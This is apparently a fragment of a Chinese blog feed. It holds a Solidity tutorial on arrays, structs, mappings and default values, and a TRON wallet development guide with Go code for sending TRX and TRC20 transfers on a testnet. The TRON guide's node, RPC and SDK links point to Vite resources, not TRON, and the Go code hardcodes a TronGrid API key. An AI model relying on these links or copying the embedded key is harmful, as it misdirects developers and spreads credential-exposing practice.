title="创建数组的规则"></a>创建数组的规则</h3><p>在Solidity里，创建数组有一些规则：</p><ul><li><p>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// memory动态数组<br>uint[] memory array8 = new uint[](5);<br>bytes memory array9 = new bytes(9);<br></code></pre></td></tr></table></figure></li><li><p>数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如<code>[1,2,3]</code>里面所有的元素都是<code>uint8</code>类型，因为在Solidity中，如果一个值没有指定type的话，会根据上下文推断出元素的类型，默认就是最小单位的type，这里默认最小单位类型是<code>uint8</code>。而<code>[uint(1),2,3]</code>里面的元素都是<code>uint</code>类型，因为第一个元素指定了是<code>uint</code>类型了，里面每一个元素的type都以第一个元素为准。</p><p>下面的例子中，如果没有对传入 <code>g()</code> 函数的数组进行 <code>uint</code> 转换，是会报错的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br>pragma solidity &gt;=0.4.16 &lt;0.9.0;<br><br>contract C &#123;<br>    function f() public pure &#123;<br>        g([uint(1), 2, 3]);<br>    &#125;<br>    function g(uint[3] memory _data) public pure &#123;<br>        // ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果创建的是动态数组，你需要一个一个元素的赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint[] memory x = new uint[](3);<br>x[0] = 1;<br>x[1] = 3;<br>x[2] = 4;<br></code></pre></td></tr></table></figure></li></ul><h3 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h3><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>拥有<code>push()</code>成员，可以在数组最后添加一个<code>0</code>元素，并返回该元素的引用。</li><li><code>push(x)</code>: <code>动态数组</code>拥有<code>push(x)</code>成员，可以在数组最后添加一个<code>x</code>元素。</li><li><code>pop()</code>: <code>动态数组</code>拥有<code>pop()</code>成员，可以移除数组最后一个元素。</li></ul><h2 id="结构体-struct"><a href="#结构体-struct" class="headerlink" title="结构体 struct"></a>结构体 struct</h2><p><code>Solidity</code>支持通过构造结构体的形式定义新的类型。结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 结构体<br>struct Student&#123;<br>    uint256 id;<br>    uint256 score; <br>&#125;<br><br>Student student; // 初始一个student结构体<br></code></pre></td></tr></table></figure><p>给结构体赋值的四种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//  给结构体赋值<br>// 方法1:在函数中创建一个storage的struct引用<br> // 4 结构体，顾名思义，各种数据类型组合的结构体，结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法：<br>    struct Student&#123;<br>        uint256 id;<br>        uint256 score;<br>    &#125;<br>    Student student; // 舒适化这个结构体，待会下面会用到的<br>    // 4.1 方法1: 给结构体赋值方式一：<br>    function initStudent1()external  &#123;<br>        Student storage _student=student ;// storage状态变量，链上存储<br>        _student.id=11;<br>        _student.score=100; // debug的时候会发现，当程序走到这里的时候 student的属性发生了改变<br>    &#125;<br>    // 4.2 方法2:直接引用状态变量的struct<br>    function initStudent2() external&#123;   <br>        student.id = 1;<br>        student.score = 80;<br>    &#125;<br>    // 4.3 方法3:构造函数式，类似与类的初始化<br>    function initStudent3() external &#123;<br>        student = Student(3, 90);<br>    &#125;<br>    // 方法4:key value<br>    function initStudent4() external &#123;<br>        student =Student(<br>            &#123;<br>                id:4,<br>                score:50<br>            &#125;<br>        );<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="7-映射类型-mapping"><a href="#7-映射类型-mapping" class="headerlink" title="7. 映射类型 mapping"></a>7. 映射类型 mapping</h1><h2 id="映射Mapping"><a href="#映射Mapping" class="headerlink" title="映射Mapping"></a>映射Mapping</h2><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>），比如：通过一个人的<code>id</code>来查询他的钱包地址。</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(uint =&gt; address) public idToAddress; // id映射到地址<br>mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址<br></code></pre></td></tr></table></figure><h2 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h2><p>​    &#x2F;&#x2F; 1、map 的key 只能是solidity 内置类型，值可以用自定义的结构体</p><p>​    &#x2F;&#x2F; 2、map的存储位置必须是storage 因此可以用于合约的状态变量、函数中的storage的变量和librry函数的参数</p><p>​    &#x2F;&#x2F; 但是不能用于public函数的啊参数或者返回值，因为map记录的是一种key-value的关系</p><p>​    &#x2F;&#x2F; 3、如果映射声明为public 那么solidity会自动为此变量创建一个getter函数来让你通过key来查询value</p><p>​    &#x2F;&#x2F; 4、增加键值对的语法为 ： Var[_Key] &#x3D; _Value,其中_Var是映射变量名，_Key和_Value对应新增的键值对</p><h2 id="映射的原理"><a href="#映射的原理" class="headerlink" title="映射的原理"></a>映射的原理</h2><ul><li><strong>原理1</strong>: 映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</li><li><strong>原理2</strong>: 对于映射使用<code>keccak256(h(key) . slot)</code>计算存取value的位置。感兴趣的可以去阅读 <a href="https://github.com/WTFAcademy/WTF-Solidity-Internals/tree/master/tutorials/02_MappingStorage">WTF Solidity 内部规则: 映射存储布局</a></li><li><strong>原理3</strong>: 因为Ethereum会定义所有未使用的空间为0，所以未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是各个type的默认值，如uint的默认值是0。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function writeMap(uint _Key,address _Value)public  &#123;<br>    idToAddress[_Key]=_Value;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-变量初始值"><a href="#8-变量初始值" class="headerlink" title="8. 变量初始值"></a>8. 变量初始值</h1><p>Solidity 和go 一样，声明但没赋值的变量都有它的初始值或者默认值，</p><h2 id="值类型变量的初始值"><a href="#值类型变量的初始值" class="headerlink" title="值类型变量的初始值"></a>值类型变量的初始值</h2><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: 枚举中的第一个元素</p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</p></li><li><pre><code class="hljs">function<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - `<span class="hljs-keyword">internal</span>`: 空白函数<br>  - `external`: 空白函数<br><br>可以用<span class="hljs-keyword">public</span>变量的getter函数验证初始值<br><br>```solidity<br>contract InitialValue &#123;<br>    <span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> _bool;<br>    <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> _string;<br>    <span class="hljs-built_in">int</span> <span class="hljs-keyword">public</span> _int;<br>    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> _uint;<br>    address <span class="hljs-keyword">public</span> _address;<span class="hljs-comment">//0x0000000000000000000000000000000000000000</span><br>    <span class="hljs-function">function <span class="hljs-title">fi</span>()<span class="hljs-keyword">internal</span></span> &#123;&#125;<span class="hljs-comment">//fi 内部函数无法调用</span><br>    <span class="hljs-function">function <span class="hljs-title">fe</span>()external</span> &#123;&#125;<span class="hljs-comment">// 空白函数</span><br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="引用类型初始值"><a href="#引用类型初始值" class="headerlink" title="引用类型初始值"></a>引用类型初始值</h3><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组array<ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><p><code>delete</code>操作符</p><p><code>delete a </code>会让变量<code>a</code>的值变为初始值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 3 delete操作符<br>bool public _bool2=true;<br>function fd()external &#123;<br>    delete _bool2;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-常数-constant和immutable"><a href="#9-常数-constant和immutable" class="headerlink" title="9. 常数 constant和immutable"></a>9. 常数 constant和immutable</h1><p><code>constant</code>:常数,</p><p><code>immutable</code>：不变量</p><p>只有数值类型的可以声明称constant 和 immutable ；</p><p><code>string</code>和<code>bytes</code>可以声明为constant 但不能为immutable;</p><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。在<code>Solidity v0.8.21</code>以后，<code>immutable</code>变量不需要显式初始化，未显式初始化的<code>immutable</code>变量将使用数值类型的初始值（见 <a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/08_InitialValue/readme.md#%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%80%BC">8. 变量初始值</a>）。反之，则需要显式初始化。 若<code>immutable</code>变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>07-8TRON波场钱包开发流程</title>
    <link href="/2025/03/13/07-8TRON%E6%B3%A2%E5%9C%BA%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2025/03/13/07-8TRON%E6%B3%A2%E5%9C%BA%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tron钱包开发详细教程"><a href="#Tron钱包开发详细教程" class="headerlink" title="Tron钱包开发详细教程"></a>Tron钱包开发详细教程</h1><h1 id="一-Tron-简介"><a href="#一-Tron-简介" class="headerlink" title="一 Tron 简介"></a>一 Tron 简介</h1><p>Tron（波场） 是一个兼容 EVM 的区块链平台,  Tron的技术架构由三层组成：</p><ul><li>存储层：包括区块存储和状态存储，支持多种存储机制。</li><li>核心层：实现了智能合约、账户管理和共识机制（目前使用的是DPoS，即委托权益证明）。</li><li>应用层：为开发者提供API和SDK，支持开发去中心化应用（DApps）</li></ul><h2 id="1-主要组件和功能"><a href="#1-主要组件和功能" class="headerlink" title="1.主要组件和功能"></a>1.主要组件和功能</h2><ul><li>Tron虚拟机（TVM）：兼容以太坊虚拟机（EVM），使开发者可以轻松将以太坊上的应用迁移到Tron上。</li><li>智能合约：支持Solidity语言编写的智能合约。</li><li>TRC-20和TRC-721标准：TRC-20是Tron的代币标准，类似于以太坊的ERC-20；TRC-721则是非同质化代币标准，类似于ERC-721。</li></ul><h2 id="2-共识机制"><a href="#2-共识机制" class="headerlink" title="2.共识机制"></a>2.共识机制</h2><ul><li>Tron采用委托权益证明（DPoS）机制。TRX持有者可以投票选举超级代表（Super Representatives，SR），这些SR负责验证交易和维护网络的安全。</li></ul><h2 id="3-生态系统"><a href="#3-生态系统" class="headerlink" title="3.生态系统"></a>3.生态系统</h2><ul><li>Tron生态系统包含多个重要组件和项目：</li><li>TronLink：官方钱包，支持TRX和TRC-20代币的存储和交易。</li><li>JustSwap：去中心化交易所，支持TRC-20代币的交易。</li><li>Sun Network：侧链扩展方案，旨在提升Tron主网的扩展性。</li><li>BitTorrent：Tron收购的去中心化文件共享协议，与Tron网络深度集成。</li><li>DApps：大量去中心化应用在 Tron 平台上运行。</li></ul><h2 id="代币（TRX）"><a href="#代币（TRX）" class="headerlink" title="代币（TRX）"></a>代币（TRX）</h2><ul><li>Tron的原生代币是TRX，主要用于以下几个方面：</li><li>交易费用：支付网络上的交易费用。</li><li>Staking和投票：TRX持有者可以质押代币并参与超级代表的选举。</li><li>DApp支付：在Tron平台上的去中心化应用中进行支付和交易。</li></ul><h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><ul><li>精度</li><li>官方网站：<a href="https://tron.network/index?lng=zh">https://tron.network/index?lng=zh</a></li><li>官方集成文档：<a href="https://developers.tron.network/">https://developers.tron.network/</a></li></ul><hr><ul><li><p>是否支持代币：支持</p></li><li><p>是否支持质押：支持</p></li><li><p>区块浏览器</p><ul><li>主网：<a href="https://tronscan.org/#/">https://tronscan.org/#/</a></li><li>测试网：<a href="https://nile.tronscan.org/?_gl=1">https://nile.tronscan.org/?_gl=1</a></li></ul></li><li><p>出块时间：每个区块的生成时间约为 <strong>3 秒</strong>。</p></li><li><p>确认位：Tron 使用 <strong>DPoS（委托权益证明）</strong>共识机制，由 27 个超级代表（Super Representatives, SR）轮流出块。通常情况下，<strong>19 个区块确认</strong>（约 57 秒）被认为是最终确认。</p></li><li><p>吞吐量：Tron 的吞吐量可以达到 <strong>2000+ TPS（每秒交易数）</strong>，远高于以太坊等区块链。</p></li><li><p>地址：Tron 地址是一个 <strong>Base58Check 编码的字符串</strong>，长度为 <strong>34 个字符</strong>，通常以字母 <strong>“T”</strong> 开头。例如：</p><ul><li>主网地址以 <strong>“T”</strong> 开头。</li><li>测试网地址以 <strong>“27”</strong> 开头。</li></ul></li><li><p>构建交易案例：</p></li><li><p>交易签名算法：</p></li><li><p>同步模型</p><ul><li><p><input checked="" disabled="" type="checkbox"> 多地址 Account</p></li><li><p><input disabled="" type="checkbox"> 多地址 UTxO</p></li><li><p><input disabled="" type="checkbox"> 单地址 Memo</p></li><li><p><input disabled="" type="checkbox"> 单地址 Paging</p></li><li><p><input disabled="" type="checkbox"> 其它方式</p></li></ul></li></ul><h2 id="矿工费形式，TRON比较特殊，单独列出来"><a href="#矿工费形式，TRON比较特殊，单独列出来" class="headerlink" title="矿工费形式，TRON比较特殊，单独列出来"></a>矿工费形式，TRON比较特殊，单独列出来</h2><p>矿工费形式：</p><h3 id="1-能量（Energy）和带宽（Bandwidth）"><a href="#1-能量（Energy）和带宽（Bandwidth）" class="headerlink" title="1.能量（Energy）和带宽（Bandwidth）"></a>1.能量（Energy）和带宽（Bandwidth）</h3><ul><li><p>Tron 使用两种资源来计算交易费用：</p><ul><li><p><strong>带宽（Bandwidth）</strong>：用于普通交易（如转账 TRX 或调用智能合约）。</p></li><li><p><strong>能量（Energy）</strong>：用于执行智能合约的复杂操作。</p></li></ul></li><li><p>用户可以通过以下方式获取带宽和能量：</p><ul><li><p><strong>质押 TRX</strong>：用户可以通过质押（冻结）TRX 来获得带宽和能量。</p></li><li><p><strong>直接支付 TRX</strong>：如果用户没有足够的带宽或能量，可以直接用 TRX 支付交易费用。</p></li></ul></li></ul><h3 id="2-带宽（Bandwidth）"><a href="#2-带宽（Bandwidth）" class="headerlink" title="2.带宽（Bandwidth）"></a>2.<strong>带宽（Bandwidth）</strong></h3><ul><li><p><strong>用途</strong>：用于普通交易（如 TRX 转账、TRC-10 代币转账）。</p></li><li><p>获取方式：</p><ul><li><strong>每天免费获得一定数量的带宽（基于质押的 TRX 数量</strong>）。</li><li>如果带宽不足，可以用 TRX 支付交易费用。</li></ul></li><li><p>费用计算</p><ul><li><strong>每笔交易消耗固定的带宽点数（例如，TRX 转账消耗约 200 带宽）</strong>。</li></ul></li><li><p>如果带宽不足，每字节交易数据消耗 0.002 TRX。</p></li></ul><hr><h3 id="3-能量（Energy）"><a href="#3-能量（Energy）" class="headerlink" title="3. 能量（Energy）"></a>3. <strong>能量（Energy）</strong></h3><ul><li><p><strong>用途</strong>：用于执行智能合约（如 TRC-20 代币转账、调用智能合约）。</p></li><li><p>获取方式：</p><ul><li>通过质押 TRX 获得能量。</li><li>如果能量不足，可以用 TRX 支付交易费用。</li></ul></li><li><p>费用计算：</p><ul><li>能量消耗取决于智能合约的复杂性和计算资源需求。</li></ul></li><li><p>如果能量不足，每单位能量消耗 0.00001 TRX。</p></li></ul><h3 id="4-TRX-支付"><a href="#4-TRX-支付" class="headerlink" title="4. TRX 支付"></a>4. <strong>TRX 支付</strong></h3><p>如果用户没有足够的带宽或能量，可以直接用 TRX 支付交易费用。费用会根据交易类型和资源消耗动态计算。</p><hr><h3 id="5-免费交易"><a href="#5-免费交易" class="headerlink" title="5. 免费交易"></a>5. <strong>免费交易</strong></h3><p>Tron 允许用户每天进行一定数量的免费交易（基于质押的 TRX 数量）。这些免费交易使用带宽，而不消耗 TRX。</p><hr><h3 id="6-矿工费优势"><a href="#6-矿工费优势" class="headerlink" title="6. 矿工费优势"></a>6. <strong>矿工费优势</strong></h3><ul><li><strong>低费用</strong>：Tron 的交易费用通常比以太坊低得多，尤其是普通转账。</li><li><strong>灵活性</strong>：用户可以选择质押 TRX 获取资源，或者直接支付 TRX。</li><li><strong>高效性</strong>：Tron 的高吞吐量（2000+ TPS）和低延迟使得交易处理速度更快。</li></ul><hr><h3 id="7-示例"><a href="#7-示例" class="headerlink" title="7. 示例"></a>7. <strong>示例</strong></h3><ul><li><strong>TRX 转账</strong>：消耗带宽，费用极低（约 0.00001 TRX）。</li><li><strong>TRC-20 代币转账</strong>：消耗能量，费用稍高（约 0.1-1 TRX，取决于合约复杂性）。</li><li><strong>智能合约调用</strong>：消耗能量，费用取决于合约的计算复杂度。</li></ul><hr><h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. <strong>总结</strong></h3><p>Tron 的矿工费形式以带宽和能量为核心，用户可以通过质押 TRX 获取资源，或者直接支付 TRX。这种设计使得 Tron 的交易费用更低、更灵活，适合高频交易和去中心化应用（DApps）的运行。</p><p>如果你有更多关于 Tron 的问题，欢迎继续提问！</p><h3 id="9-交易的生命周期"><a href="#9-交易的生命周期" class="headerlink" title="9. 交易的生命周期"></a>9. <strong>交易的生命周期</strong></h3><p>流程：构建–&gt;签名–&gt;广播–&gt;确认</p><p>生命周期：</p><ul><li>交易的创建和签名</li><li>广播道Tron网络中，经过节点验证和执行，收录进一个交易缓存池中</li><li>出块节点按照交易放入的顺序，逐个从交易缓存池中取出交易，打包成一个新区块，然后将新区块广播到TRON网络。</li><li>交易会被“确认”。交易是否被确认，取决于包含该交易的区块是否被确认。TRON的区块确认机制是，一个区块产生后，19个不同的超级节点会根据这个区块产生后续的区块，然后这个区块就被确认了。</li></ul><h2 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h2><p><strong>节点构建和使用文档</strong></p><p><a href="https://docs.vite.org/vite-docs/tutorial/node/install.html">https://docs.vite.org/vite-docs/tutorial/node/install.html</a></p><p><strong>RPC文档</strong></p><p><a href="https://docs.vite.org/vite-docs/api/rpc/ledger_v2.html">https://docs.vite.org/vite-docs/api/rpc/ledger_v2.html</a></p><p><strong>RPC通信方式</strong></p><ul><li><input checked="" disabled="" type="checkbox"> HTTP(s)</li><li><input disabled="" type="checkbox"> WebSocket</li><li><input disabled="" type="checkbox"> GRPC<br><strong>公共节点</strong></li></ul><h3 id="公共节点"><a href="#公共节点" class="headerlink" title="公共节点"></a>公共节点</h3><p>节点：<a href="https://docs.vite.org/vite-docs/tutorial/sppguide/tutorials/dev-wallet.html#personal-wallet-setup">https://docs.vite.org/vite-docs/tutorial/sppguide/tutorials/dev-wallet.html#personal-wallet-setup</a></p><ol><li>[主网]：<a href="https://node.vite.net/gvite">https://node.vite.net/gvite</a></li><li>[测试网]：<a href="https://buidl.vite.net/gvite">https://buidl.vite.net/gvite</a></li></ol><h3 id="浏览器钱包"><a href="#浏览器钱包" class="headerlink" title="浏览器钱包"></a>浏览器钱包</h3><p><a href="https://app.vite.net/">https://app.vite.net/</a></p><h2 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h2><p>仓库：<a href="https://github.com/vitelabs/go-vite">https://github.com/vitelabs/go-vite</a></p><p>交易所整合VITE：<a href="https://docs.vite.org/vite-docs/tutorial/faq/dex.html">https://docs.vite.org/vite-docs/tutorial/faq/dex.html</a></p><p>API：<a href="https://docs.vite.org/vite-docs/tutorial/faq/dex.html#">https://docs.vite.org/vite-docs/tutorial/faq/dex.html#</a></p><p><strong>编程语言</strong></p><p>Go</p><p><strong>以下流程是否完整支持</strong></p><ul><li><input checked="" disabled="" type="checkbox"> HTTP</li><li><input checked="" disabled="" type="checkbox"> 构建待签名交易</li><li><input checked="" disabled="" type="checkbox"> 合并签名和原始交易</li><li><input checked="" disabled="" type="checkbox"> 获取签名交易 ID</li><li><input checked="" disabled="" type="checkbox"> 生成地址</li><li><input checked="" disabled="" type="checkbox"> 校验地址</li></ul><h1 id="地址生成"><a href="#地址生成" class="headerlink" title="地址生成"></a>地址生成</h1><h1 id="构建交易"><a href="#构建交易" class="headerlink" title="构建交易"></a>构建交易</h1><p>Tron 地址的生成过程如下：</p><ol><li><p><strong>生成私钥</strong>：随机生成一个 256 位的私钥。</p></li><li><p><strong>生成公钥</strong>：通过椭圆曲线加密算法（ECDSA，secp256k1）从私钥生成公钥。</p></li><li><p>计算公钥哈希：</p><ul><li><p>对公钥进行 Keccak-256 哈希运算。</p></li><li><p>取哈希值的最后 20 字节作为公钥哈希。</p></li></ul></li><li><p>添加前缀：</p><ul><li>在主网中，添加字节 <code>0x41</code> 作为前缀。</li></ul></li><li><p>计算校验和：</p><ul><li>对前缀和公钥哈希进行两次 SHA-256 哈希运算。</li><li>取前 4 个字节作为校验和。</li></ul></li><li><p>Base58Check 编码：</p><ul><li>将前缀、公钥哈希和校验和组合，并进行 Base58Check 编码，生成最终的 Tron 地址。</li></ul></li></ol><h2 id="构建发送TRX交易，基本不需要消耗fee"><a href="#构建发送TRX交易，基本不需要消耗fee" class="headerlink" title="构建发送TRX交易，基本不需要消耗fee"></a>构建发送TRX交易，基本不需要消耗fee</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SendTrx</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;开始发送TRX&quot;</span>) <span class="hljs-comment">// api key b862ca9d-563b-4eec-8108-2d436b614561</span><br>opts := <span class="hljs-built_in">make</span>([]grpc.DialOption, <span class="hljs-number">0</span>)<br>opts = <span class="hljs-built_in">append</span>(opts, grpc.WithInsecure())<br>c := client.NewGrpcClient(<span class="hljs-string">&quot;grpc.nile.trongrid.io:50051&quot;</span>)<br><br><span class="hljs-keyword">if</span> err := c.Start(opts...); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Start err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> err := c.SetAPIKey(<span class="hljs-string">&quot;b862ca9d-563b-4eec-8108-2d436b614561&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;SetAPIKey err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>alice := <span class="hljs-string">&quot;TBSssNBoAX5isgjaR9cLZ4i84rf1Q7A5gr&quot;</span><br>bob := <span class="hljs-string">&quot;TJF5RmJW2io8pcbHVXAGf9i5uXncJQBxX3&quot;</span><br><br><span class="hljs-comment">// 1. 创建转账交易</span><br>tx, err := c.Transfer(alice, bob, <span class="hljs-number">1000</span>)<br><span class="hljs-comment">// 没有找到自定义带宽和能量的方法，只能用默认的</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;创建交易失败:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 2.恢复签名者</span><br>keyStore, keyStoreAccount, err := store.UnlockedKeystore(alice, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;解锁账户失败=%v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 3. 签名交易</span><br>controller := transaction.NewController(c, keyStore, keyStoreAccount, tx.Transaction)<br><span class="hljs-comment">// 4. 广播交易---&gt;这里很特别，新建控制器，通过控制器去执行交易，是一种设计模式，把步骤变成一种行为</span><br><span class="hljs-keyword">if</span> err = controller.ExecuteTransaction(); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Warnf(<span class="hljs-string">&quot;ExecuteTransaction error: %s&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>txHash, err := controller.TransactionHash()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;TransactionHash err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;https://nile.tronscan.org/#/transaction/%s&quot;</span>, txHash[<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">return</span> controller.Result.Result<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构建TRC20-转账交易"><a href="#构建TRC20-转账交易" class="headerlink" title="构建TRC20 转账交易"></a>构建TRC20 转账交易</h2><p>不同的就是构建交易那里换一个方法输入对应的合约调用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 1. 构建发送TRC20交易</span><br>tx, err := c.TRC20Send(alice, bob, contractAddress, big.NewInt(<span class="hljs-number">100000000</span>), <span class="hljs-number">25000000</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;TRC20Send err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span 